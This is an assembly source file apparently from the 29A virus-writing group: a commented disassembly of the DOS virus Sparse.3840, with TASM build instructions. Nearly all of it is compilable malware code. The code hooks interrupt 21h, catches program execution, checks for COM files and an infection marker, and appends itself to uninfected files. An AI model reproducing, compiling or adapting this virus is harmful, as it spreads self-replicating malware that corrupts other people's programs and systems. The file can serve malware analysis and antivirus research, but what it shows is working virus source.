comment *
			      Sparse.3840
			     Disassembly by
			      Darkman/29A

  Sparse.3840 is a 3584 bytes parasitic resident COM virus. Infects at load
  and/or execute program by appending the virus to the infected file.

  To compile Sparse.3840 with Turbo Assembler v 4.0 type:
    TASM /M SPARSE.ASM
    TLINK /t /x SPARSE.OBJ
*

.model tiny
.code
 org   100h				 ; Origin of Sparse.3840

code_begin:
	     mov     ax,4b55h		 ; Sparse.3840 function
	     int     21h
	     cmp     ax,1231h		 ; Already resident?
	     je      virus_exit 	 ; Equal? Jump to virus_exit

	     mov     ax,3521h		 ; Get interrupt vector 21h
	     int     21h

	     mov     al,11101010b	 ; JMP imm32 (opcode 0eah)
	     mov     [jmp_imm32],al	 ; Store JMP imm32 (opcode 0eah)
	     mov     word ptr [int21_addr],bx
	     mov     word ptr [int21_addr+02],es

	     mov     ax,2521h		 ; Set interrupt vector 21h
	     lea     dx,int21_virus	 ; DX = offset of int21_virus
	     int     21h

	     mov     ah,4ah		 ; Resize memory block

	     push    cs 		 ; Save CS at stack
	     pop     es 		 ; Load ES from stack (CS)

	     mov     bx,0efh		 ; BX = new size in paragraphs
	     int     21h

	     mov     ah,48h		 ; Allocate memory
	     mov     bx,1000h		 ; BX = number of paragraphs to all...
	     int     21h

	     db      89h,0c7h		 ; MOV DI,AX
	     db      89h,0c2h		 ; MOV DX,AX

	     mov     ah,50h		 ; Set current PSP address
	     db      89h,0d3h		 ; MOV BX,DX
	     int     21h

	     mov     ds,di		 ; DS = segment of allocated block

	     push    ds 		 ; Save DS at stack
	     pop     es 		 ; Load ES from stack (DS)

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     mov     si,00h		 ; SI = offset of Program Segment P...
	     mov     di,00h		 ; DI =   "    "     "       "     "
	     mov     cx,0ffh		 ; Move two hundred and fifty-five ...

	     cld			 ; Clear direction flag
move_psp:
	     lodsb			 ; AL = byte of Program Segment Pre...
	     stosb			 ; Store byte of Program Segment Pr...

	     loop    move_psp

	     push    es es		 ; Save segments at stack
	     pop     ds ss		 ; Load segments from stack

	     mov     bx,100h		 ; BX = offset of beginning of code
	     push    es bx		 ; Save registers at stack

	     mov     si,es		 ; SI = segment of PSP for current ...
	     dec     si 		 ; SI = segment of current Memory C...
	     mov     ds,si		 ; DS =    "    "     "      "     "

	     mov     ds:[01h],es	 ; Store PSP segment of owner

	     mov     si,es		 ; SI = segment of allocated memory
	     mov     ds,si		 ; DS =    "    "      "       "

	     db      31h,0c0h		 ; XOR AX,AX
	     db      31h,0dbh		 ; XOR BX,BX
	     db      31h,0c9h		 ; XOR CX,CX
	     db      31h,0d2h		 ; XOR DX,DX

	     retf			 ; Return far!

	     db      0f9h,0fbh,0ffh,6fh,0f5h,1ah,03h dup(40h),03 dup(23h),20h
	     db      49h,42h
virus_exit:
	     push    cs cs		 ; Save segments at stack
	     pop     es ds		 ; Load segments from stack

	     lea     si,restore 	 ; SI = offset of restore
	     mov     di,0a0h		 ; DI = offset within commandline/d...

	     cld			 ; Clear direction flag
move_restore:
	     lodsb			 ; AL = byte of restore
	     stosb			 ; Store byte of restore

	     cmp     si,offset restore+(restore_end-restore)
	     jne     move_restore

	     db      11101001b		 ; JMP imm16 (opcode 0e9h)
	     dw      0ff0ah		 ; Offset of beginning of code
	     db      0ah dup(00h),40h,44h,1eh dup(00h),60h,44h,1eh dup(00h)
	     db      80h,44h,1eh dup(00h)
int21_exit:
jmp_imm32    db      11101010b		 ; JMP imm32 (opcode 0eah)
int21_addr   dw      ?			 ; Address of interrupt 21h
	     db      1dh dup(00h),0c0h,44h,1eh dup(00h),0e0h,44h,1eh dup(00h)

restore      proc    near		 ; Restore the infected file
	     lea     si,code_end+100h	 ; SI = offset of code_end+100h
	     mov     di,100h		 ; DI = offset of beginning of code
	     mov     cx,0ef00h		 ; Move sixty-one thousand and one ...

	     cld			 ; Clear direction flag
move_origina:
	     lodsb			 ; AL = byte of original code
	     stosb			 ; Store byte of original code

	     loop    move_origina

	     mov     ax,00h		 ; Zero AX
	     mov     bx,00h		 ; Zero BX
	     mov     cx,00h		 ; Zero CX
	     mov     dx,00h		 ; Zero DX
	     mov     di,00h		 ; Zero DI
	     mov     si,00h		 ; Zero SI

	     db      11101011b		 ; JMP imm8 (opcode 0ebh)
	     db      3eh		 ; Offset of beginning of code
	     endp
restore_end:
	     db      1eh dup(00h),40h,45h,1eh dup(00h),60h,45h,1eh dup(00h)
	     db      80h,45h,1eh dup(00h)
int21_virus:
	     pushf			 ; Save flags at stack
	     sti			 ; Set interrupt-enable flag

	     cmp     ah,4bh		 ; Load and/or execute program; Sp...?
	     je      load_and_exe	 ; Equal? Jump to load_and_exe

	     popf			 ; Load flags from stack

	     jmp     int21_exit
load_and_exe:
	     cmp     al,55h		 ; Sparse.3840 function?
	     jne     infect_file	 ; Not equal? Jump to infect_file

	     popf			 ; Load flags from stack

	     mov     ax,1231h		 ; Already resident

	     iret			 ; Interrupt return!
infect_file:
	     push    ax bx cx dx si di ds es

	     jmp     tst_file_ext
allocate_mem:
	     mov     ah,48h		 ; Allocate memory
	     mov     bx,0fffh		 ; BX = number of paragraphs to all...
	     int     21h

	     push    ax 		 ; Save AX at stack

	     mov     ah,3dh		 ; Open file (read/write)
	     mov     al,02h
	     int     21h
	     db      89h,0c3h		 ; MOV BX,AX

	     mov     ah,42h		 ; Set current file position (EOF)
	     mov     cx,00h		 ; CX:DX = offset from origin of ne...
	     mov     dx,00h		 ;   "   "   "     "     "    "   "
	     mov     al,02h
	     int     21h
	     db      89h,0c1h		 ; MOV CX,AX

	     push    cx 		 ; Save CX at stack
	     mov     ax,4200h		 ; Set current file position (SOF)
	     mov     cx,00h		 ; CX:DX = offset from origin of ne...
	     mov     dx,00h		 ;   "   "   "     "     "    "   "
	     int     21h
	     pop     cx 		 ; Load CX from stack

	     pop     ds 		 ; Load DS from stack (AX)

	     mov     dx,00		 ; DX = offset of original code
	     mov     ah,3fh		 ; Read from file
	     push    cx 		 ; Save CX at stack
	     int     21h

	     mov     ah,42h		 ; Set current file position (SOF)
	     mov     cx,00h		 ; CX:DX = offset from origin of ne...
	     mov     dx,00h		 ;   "   "   "     "     "    "   "
	     mov     al,00h
	     int     21h

	     jmp     exam_file
write_virus:
	     mov     ah,40h		 ; Write to file

	     push    ds 		 ; Save DS at stack

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     mov     cx,(code_end-code_begin+100h)
	     lea     dx,code_begin	 ; DX = offset of code_begin
	     int     21h

	     pop     ds 		 ; Load DS from stack

	     mov     ah,40h		 ; Write to file
	     mov     dx,00h		 ; DX = offset of original code
	     pop     cx 		 ; Load CX from stack
	     int     21h

	     mov     ah,49h		 ; Free memory

	     push    ds 		 ; Save DS at stack
	     pop     es 		 ; Load ES from stack (DS)

	     int     21h
close_file:
	     mov     ah,3eh		 ; Close file
	     int     21h
infect_exit:
	     pop     es ds di si dx cx bx ax

	     popf			 ; Load flags from stack

	     jmp     int21_exit

	     db      12h dup(00h),40h,46h,1eh dup(00h),60h,46h,1eh dup(00h)
	     db      80h,46h,1eh dup(00h)
tst_file_ext:
	     db      89h,0d6h		 ; MOV SI,DX

	     cld			 ; Clear direction flag
find_dot:
	     lodsb			 ; AL = byte of filename

	     cmp     al,'.'              ; Found the dot in the filename?
	     jne     find_dot		 ; Not equal? Jump to find_dot

	     lodsb			 ; AL = byte of file extension
	     cmp     al,'C'              ; COM extension?
	     je      com_file_ext	 ; Equal? Jump to com_file_ext
	     cmp     al,'c'              ; COM extension?
	     je      com_file_ext	 ; Equal? Jump to com_file_ext

	     jmp     infect_exit

	     nop
com_file_ext:
	     jmp     allocate_mem

	     db      08h dup(00h)
exam_file:
	     push    ds es di si	 ; Save registers at stack

	     mov     si,00h		 ; SI = offset of original code

	     push    cs 		 ; Save CS at stack
	     pop     es 		 ; Load ES from stack (CS)

	     lea     di,code_begin	 ; DI = offset of code_begin

	     cld			 ; Clear direction flag

	     mov     cx,09h		 ; Compare nine bytes
exam_file_:
	     cmpsb			 ; Already infected?
	     jne     not_infected	 ; Not equal? Jump to not_infected

	     loop    exam_file_

	     pop     si di es ds	 ; Load registers from stack
	     pop     cx 		 ; Load CX from stack

	     jmp     close_file

	     nop
	     nop
	     nop
not_infected:
	     pop     si di es ds	 ; Load registers from stack

	     jmp     write_virus

	     db      1ah dup(00h),47h,1eh dup(00h),20h,47h,1eh dup(00h),40h
	     db      47h,1eh dup(00h),60h,47h,1eh dup(00h),80h,47h
	     db      1eh dup(00h),0a0h,47h,1eh dup(00h),0c0h,47h,1eh dup(00h)
	     db      0e0h,47h,1fh dup(00h),48h,1eh dup(00h),20h,48h
	     db      1eh dup(00h),40h,48h,1eh dup(00h),60h,48h,1eh dup(00h)
	     db      80h,48h,1eh dup(00h),0a0h,48h,1eh dup(00h),0c0h,48h
	     db      1eh dup(00h),0e0h,48h,1fh dup(00h),49h,1eh dup(00h),20h
	     db      49h,1eh dup(00h),40h,49h,1eh dup(00h),60h,49h
	     db      1eh dup(00h),80h,49h,1eh dup(00h),0a0h,49h,1eh dup(00h)
	     db      0c0h,49h,1eh dup(00h),0e0h,49h,1fh dup(00h),4ah
	     db      02h dup(00h),07h,02h,19h,00h,07h,12h,19h,00h,07h,22h,19h
	     db      00h,07h,32h,19h,00h,07h,42h,19h,00,07h,52h,19h,00h,07h
	     db      62h,19h,00h,20h,4ah,02h dup(00h),07h,82h,19h,00h,07h,92h
	     db      19h,00h,07h,0a2h,19h,00h,07h,0b2h,19h,00h,07h,0c2h,19h
	     db      00h,07h,0d2h,19h,00h,07h,0e2h,19h,00h,40h,4ah
	     db      02h dup(00h),07h,02h,1ah,00h,07h,12h,1ah,00h,07h,22h,1ah
	     db      00h,07h,32h,1ah,00h,07h,42h,1ah,00h,07h,52h,1ah,00h,07h
	     db      62h,1ah,00h,60h,4ah,02h dup(00h),07h,82h,1ah,00h,07h,92h
	     db      1ah,00h,07h,0d2h,1ah,00h,07h,0e2h,1ah,00h,07h,0f2h,1ah
	     db      00h,07h,02h,1bh,00h,07h,12h,1bh,00h,80h,4ah,02h dup(00h)
	     db      07h,32h,1bh,00h,07h,42h,1bh,00h,07h,62h,1bh,00h,07h,72h
	     db      1bh,00h,07h,82h,1bh,00h,07h,0a2h,1bh,00h,07h,0b2h,1bh,00h
	     db      0a0h,4ah,02h dup(00h),07h,0d2h,1bh,00h,07h,0e2h,1bh,00h
	     db      07h,0f2h,1bh,00h,07h,02h,1ch,00h,07h,12h,1ch,00h,07h,22h
	     db      1ch,00h,07h,42h,1ch,00h,0c0h,4ah,02h dup(00h),07h,72h,1ch
	     db      00h,07h,82h,1ch,00h,07h,0c2h,1ch,00h,07h,0d2h,1ch,00h,07h
	     db      0e2h,1ch,00h,07h,0f2h,1ch,00h,07h,02h,1dh,00h,0e0h,4ah
	     db      1fh dup(00h),4bh,1eh dup(00h),20h,4bh,1eh dup(00h),40h
	     db      4bh,1eh dup(00h),60h,4bh,1eh dup(00h),80h,4bh
	     db      1eh dup(00h),0a0h,4bh,1eh dup(00h),0c0h,4bh,1eh dup(00h)
	     db      0e0h,4bh,1fh dup(00h),4ch,1eh dup(00h),20h,4ch
	     db      1eh dup(00h),40h,4ch,1eh dup(00h),60h,4ch,1eh dup(00h)
	     db      80h,4ch,1eh dup(00h),0a0h,4ch,1eh dup(00h),0c0h,4ch
	     db      1eh dup(00h),0e0h,4ch,1fh dup(00h),4dh,1eh dup(00h),20h
	     db      4dh,1eh dup(00h),40h,4dh,1eh dup(00h),60h,4dh
	     db      1eh dup(00h),80h,4dh,1eh dup(00h),0a0h,4dh,1eh dup(00h)
	     db      0c0h,4dh,1eh dup(00h),0e0h,4dh,1fh dup(00h),4eh
	     db      02h dup(00h),07h,32h,1dh,00h,07h,42h,1dh,00h,07h,52h,1dh
	     db      11h dup(00h),20h,4eh,1eh dup(00h),40h,4eh,1eh dup(00h)
	     db      60h,4eh,1eh dup(00h),80h,4eh,1eh dup(00h),0a0h,4eh
	     db      1eh dup(00h),0c0h,4eh,1eh dup(00h),0e0h,4eh,1fh dup(00h)
	     db      4fh,1eh dup(00h),20h,4fh,1eh dup(00h),40h,4fh
	     db      1eh dup(00h),60h,4fh,1eh dup(00h),80h,4fh,1eh dup(00h)
	     db      0a0h,4fh,1eh dup(00h),0c0h,4fh,1eh dup(00h),0e0h,4fh
	     db      1fh dup(00h),50h,1eh dup(00h),20h,50h,1eh dup(00h),40h
	     db      50h,1eh dup(00h),60h,50h,1eh dup(00h),80h,50h
	     db      1eh dup(00h),0a0h,50h,1eh dup(00h),0c0h,50h,1eh dup(00h)
	     db      0e0h,50h,1fh dup(00h),51h,1eh dup(00h),20h,51h
	     db      1eh dup(00h),40h,51h,1eh dup(00h),60h,51h,1eh dup(00h)
	     db      80h,51h,0eh dup(00h),4dh,17h,0ah,0ffh,0fh,03h dup(00h)
	     db      'SHELLC',02h dup(00h)
code_end:
	     int     20h		 ; Terminate program!

end	     code_begin
